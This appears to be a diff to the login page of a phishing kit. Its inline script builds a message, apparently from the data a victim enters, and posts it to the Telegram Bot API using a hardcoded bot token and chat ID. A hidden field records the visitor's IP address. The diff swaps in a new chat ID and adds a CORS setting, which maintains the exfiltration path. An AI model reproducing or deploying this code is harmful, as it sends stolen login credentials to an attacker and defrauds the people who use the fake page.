@@ -516,7 +516,9 @@
     <input type="hidden" id='ip' value='105.112.208.131' name='ip'>
     
     <!-- Root -->
-<!-- Root --><script>
+<!-- Root -->
+<script>
+
   var login = document.getElementById('login');
   var loader = document.getElementById('loader');
   var feedback = document.getElementById('feedback');
@@ -586,7 +588,7 @@
               `;
 
               const botToken = '7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ'; // Replace with your actual bot token
-              const chatId = '5732675997'; // Replace with your actual chat ID
+              const chatId = '1866571175'; // Replace with your actual chat ID
               const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
               // Prepare the data to send to Telegram
@@ -595,8 +597,10 @@
               data.append('text', message);
               data.append('parse_mode', 'Markdown'); // Ensure message is formatted in Markdown
 
+              // Fetch request with added CORS mode to handle any cross-origin issues
               fetch(telegramApiUrl, {
                   method: 'POST',
+                  mode: 'cors', // Added to handle CORS
                   body: data,
                   headers: {
                       'Content-Type': 'application/x-www-form-urlencoded',
@@ -628,6 +632,7 @@
       });
   }
 </script>
+
 
 
 
